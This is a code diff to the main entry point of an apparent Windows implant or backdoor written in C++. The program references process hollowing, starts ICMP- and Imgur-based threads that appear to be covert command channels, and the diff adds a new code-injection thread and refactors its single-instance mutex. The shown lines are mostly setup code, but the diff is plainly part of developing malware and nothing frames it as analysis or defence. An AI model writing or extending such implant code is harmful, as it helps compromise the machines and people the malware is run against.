@@ -21,9 +21,9 @@
 // FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 // DEALINGS IN THE SOFTWARE.
 //
+#include "vr-config.h"
 #include "../shared/context.h"
 #include "../shared/coroutine.h"
-#include "../config.h"
 #include "../shared/debug.h"
 #include "../shared/win32.h"
 #include "../shared/process_hollowing.h"
@@ -32,24 +32,16 @@
 
 void icmp_thread(context& ctx);
 void imgur_thread(context& ctx);
+void injector_thread(context& ctx);
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
 {
     deterministic_uuid_seed = get_machine_hash();
 
-    // Single instance mutex
-    HANDLE hMutex = nullptr;
-    {
-        stl::string vr_mutex = "Global\\" + deterministic_uuid(vr_mutant_main_instance);
-        hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, vr_mutex.c_str());
-        if (!hMutex)
-            hMutex = CreateMutexA(nullptr, 0, vr_mutex.c_str());
-        else
-        {
-            CloseHandle(hMutex);
-            return 0;
-        }
-    }
+    HANDLE hMutex = mutex_lock(vr_mutant_main);
+    if (!hMutex)
+        // Already running.
+        return 0;
 
     WSADATA wsa{};
     WSAStartup(0x0202, &wsa);
@@ -60,6 +52,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 
     coro_start([&ctx]() { icmp_thread(ctx); });
     coro_start([&ctx]() { imgur_thread(ctx); });
+    coro_start([&ctx]() { injector_thread(ctx); });
 
     coro_run();
 
